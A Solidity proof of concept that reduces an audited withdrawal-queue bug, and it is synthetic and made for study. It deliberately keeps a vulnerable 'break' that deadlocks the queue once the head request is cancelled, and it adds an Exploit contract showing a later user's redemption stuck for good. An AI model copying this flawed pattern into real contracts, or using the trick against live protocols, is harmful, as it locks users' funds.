// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Accountable — Cancelling redeem requests permanently blocks the
    withdrawal queue (Cyfrin 2025-10-16, finding #62968)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: when the queue head is fully deleted (cancel zeroes the
    entry), `_processUpToShares` sees `shares_ == 0` and BREAKs before
    advancing `nextRequestId`. The empty head is never skipped, so every
    subsequent process is stuck forever — tail requests never claim.
    Vulnerable `if (shares_ == 0) break;` preserved VERBATIM (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 for vault assets (USDC-style abstract units).
contract MockToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced AccountableWithdrawalQueue with the head-deletion deadlock.
/// Source: AccountableWithdrawalQueue.sol (Accountable-Protocol audit-2025-09
/// @custom:commit fc43546 — `_processUpToShares` / `_processRequest` / `_delete`.
contract AccountableWithdrawalQueue {
    struct Request {
        address controller;
        uint256 shares;
        uint256 assets; // claimable once processed
    }

    mapping(uint128 => Request) public requests;
    mapping(address => uint128) public requestIds;
    uint128 public nextRequestId = 1; // head pointer
    uint128 public lastRequestId; // last enqueued id

    mapping(address => uint256) public pendingShares; // still in queue
    mapping(address => uint256) public claimableAssets;

    uint256 public liquidity; // available to process

    function seedLiquidity(uint256 amt) external {
        liquidity += amt;
    }

    /// @notice Enqueue a redeem request for `controller`.
    function requestRedeem(uint256 shares, address controller) external returns (uint128 id) {
        require(shares > 0, "zero");
        require(requestIds[controller] == 0, "exists");
        id = ++lastRequestId;
        requests[id] = Request({controller: controller, shares: shares, assets: 0});
        requestIds[controller] = id;
        pendingShares[controller] = shares;
    }

    /// @dev Deletes a withdrawal request and its controller from the queue
    function _delete(address controller, uint128 requestId) private {
        delete requests[requestId];
        delete requestIds[controller];
    }

    /// @notice Cancel: fully removes the request entry (controller becomes address(0)).
    /// Does NOT advance nextRequestId — matching the audited behavior.
    function cancelRedeemRequest(uint128 requestId, address controller) external {
        Request storage r = requests[requestId];
        require(r.controller == controller, "ctrl");
        pendingShares[controller] = 0;
        _delete(controller, requestId);
        // NOTE: nextRequestId is intentionally NOT advanced here (audited code).
    }

    function _processRequest(uint128 requestId, uint256 availLiquidity, uint256 maxShares)
        private
        returns (uint256 shares_, uint256 assets_, bool processed_)
    {
        Request storage request = requests[requestId];
        // Empty / deleted head: processed=true but shares=0
        if (request.controller == address(0)) return (0, 0, true);

        uint256 take = request.shares;
        if (take > maxShares) take = maxShares;
        // 1:1 share→asset for synthetic simplicity
        uint256 assetsNeeded = take;
        if (assetsNeeded > availLiquidity) {
            // Not enough liquidity — not processed
            return (0, 0, false);
        }
        shares_ = take;
        assets_ = assetsNeeded;
        processed_ = true;

        request.shares -= take;
        pendingShares[request.controller] -= take;
        claimableAssets[request.controller] += assets_;
        if (request.shares == 0) {
            _delete(request.controller, requestId);
        }
    }

    /// @notice Process queue up to `maxShares_`. Deadlocks on deleted head.
    /// Source: AccountableWithdrawalQueue::_processUpToShares @ L153-L156
    function processUpToShares(uint256 maxShares_) external returns (uint256 used) {
        uint256 remaining = maxShares_;
        uint256 liq = liquidity;
        // Process from head; break on empty head WITHOUT advancing (the bug).
        while (nextRequestId <= lastRequestId && remaining > 0) {
            uint128 request_ = nextRequestId;
            (uint256 shares_, uint256 assets_, bool processed_) =
                _processRequest(request_, liq, remaining);

            if (shares_ == 0) break; // @> VULN: empty/deleted head returns (0,0,true) but break skips ++nextRequestId → permanent deadlock
            // FIX: if (shares_ == 0) { if (processed_) { ++nextRequestId; continue; } break; }

            liq -= assets_;
            remaining -= shares_;
            used += assets_;
            // Advance only when the entry is gone (controller cleared)
            if (requests[request_].controller == address(0)) {
                ++nextRequestId;
            } else {
                // Partial fill — stop
                break;
            }
        }
        liquidity = liq;
    }

    function processUpToRequestId(uint128 target) external returns (uint256 sharesOut, uint256 assetsOut) {
        uint256 liq = liquidity;
        while (nextRequestId <= lastRequestId && nextRequestId <= target) {
            uint128 request_ = nextRequestId;
            (uint256 shares_, uint256 assets_, bool processed_) =
                _processRequest(request_, liq, type(uint256).max);

            if (shares_ == 0) break; // @> VULN: same head-deadlock on empty slot

            liq -= assets_;
            sharesOut += shares_;
            assetsOut += assets_;
            if (requests[request_].controller == address(0)) {
                ++nextRequestId;
            } else {
                break;
            }
        }
        liquidity = liq;
    }

    function queue() external view returns (uint128 nextId, uint128 lastId) {
        return (nextRequestId, lastRequestId);
    }
}

/// @notice End-to-end exploit: Alice cancels head → Charlie's redeem permanently stuck.
/// CREATE order: token (1), queue (2).
contract Exploit {
    MockToken public token;
    AccountableWithdrawalQueue public queue;

    address public constant ALICE = address(0xA11CE);
    address public constant CHARLIE = address(0xC4A12E);

    uint256 public charliePendingAfter;
    uint256 public charlieClaimableAfter;
    uint128 public nextIdAfter;
    uint256 public usedOnProcess;

    constructor() {
        token = new MockToken(); // nonce 1
        queue = new AccountableWithdrawalQueue(); // nonce 2 — vulnerable
    }

    function run() external {
        // Seed liquidity so Charlie's redeem would be processable if head advanced.
        queue.seedLiquidity(1000e6);

        // 1) Alice creates head redeem request (id = 1)
        uint256 aliceShares = 1;
        uint128 headId = queue.requestRedeem(aliceShares, ALICE);
        require(headId == 1, "head id");

        // 2) Alice cancels → head entry fully deleted, nextRequestId stays at 1
        queue.cancelRedeemRequest(headId, ALICE);
        (uint128 nextId, ) = queue.queue();
        require(nextId == 1, "next stuck at deleted head");
        (address headCtrl, , ) = queue.requests(1);
        require(headCtrl == address(0), "head deleted");

        // 3) Charlie enqueues a processable redeem (id = 2)
        uint256 charlieShares = 500e6;
        uint128 tailId = queue.requestRedeem(charlieShares, CHARLIE);
        require(tailId == 2, "tail id");
        (nextId, ) = queue.queue();
        require(nextId == 1, "still pointing at deleted head");

        // 4) Process: deadlocks on empty head — used == 0, Charlie unclaimable
        usedOnProcess = queue.processUpToShares(type(uint256).max);
        require(usedOnProcess == 0, "deadlock: processing must do nothing");

        (uint256 s2, uint256 a2) = queue.processUpToRequestId(2);
        require(s2 == 0 && a2 == 0, "deadlock processUpToRequestId");

        charliePendingAfter = queue.pendingShares(CHARLIE);
        charlieClaimableAfter = queue.claimableAssets(CHARLIE);
        (nextIdAfter, ) = queue.queue();

        require(charliePendingAfter == charlieShares, "tail still fully pending");
        require(charlieClaimableAfter == 0, "tail unclaimable");
        require(nextIdAfter == 1, "nextRequestId still stuck");

        // Harm: withdrawal queue permanently bricked for all subsequent users.
        require(
            usedOnProcess == 0 && charlieClaimableAfter == 0 && nextIdAfter == 1,
            "harm not demonstrated"
        );
    }
}
